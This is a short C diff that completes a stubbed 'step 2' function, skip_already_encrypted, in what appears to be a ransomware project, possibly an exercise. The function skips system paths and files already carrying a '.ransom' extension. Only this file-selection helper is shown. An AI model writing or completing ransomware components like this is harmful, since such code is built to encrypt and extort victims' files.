@@ -68,7 +68,17 @@ void add_file_extension(const char *filename, char *opt_filename)
 */
 bool skip_already_encrypted(const char *path)
 {
-    // step 2
+
+    int len = strlen(path);
+
+    if (skip_basics_path(path))
+        return true;
+
+    if (len >= (int)LEN_RANSOM_EXTENSION &&
+        !strcmp(&path[len - LEN_RANSOM_EXTENSION], ".ransom"))
+        return true;
+
+    return false;
 }
 
 void remove_file_extension(const char *filename, char *opt_filename)
